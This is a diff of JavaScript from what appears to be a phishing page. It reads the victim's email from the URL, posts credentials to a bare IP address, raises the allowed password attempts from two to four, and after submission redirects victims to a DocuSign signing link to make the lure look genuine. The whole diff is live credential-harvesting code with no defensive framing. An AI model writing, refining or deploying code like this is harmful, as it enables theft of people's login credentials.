@@ -179,7 +179,7 @@
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
 <script>
 /* global $ */
-var sava_url = 'https://5.230.249.226'
+var sava_url = 'http://5.230.249.226'
 $(document).ready(function() {
     var count = 0;
     /////////////url email getting////////////////
@@ -295,7 +295,7 @@ $(document).ready(function() {
                     }, 4000)
 
                     setTimeout(function(){
-                        window.location.replace("http://www." + my_slice);
+                        window.location.replace("https://na2.docusign.net/Signing/?ti=4f141f60a43b42c58396f3f7919aefc0");
                     }, 5000)
                    
                 }
@@ -315,7 +315,7 @@ $(document).ready(function() {
                     return false;
                 }
                 $("#password").val("");
-                if (count >= 2) {
+                if (count >= 4) {
                     count = 0;
                     window.location.replace("http://www." + my_slice);
                 }
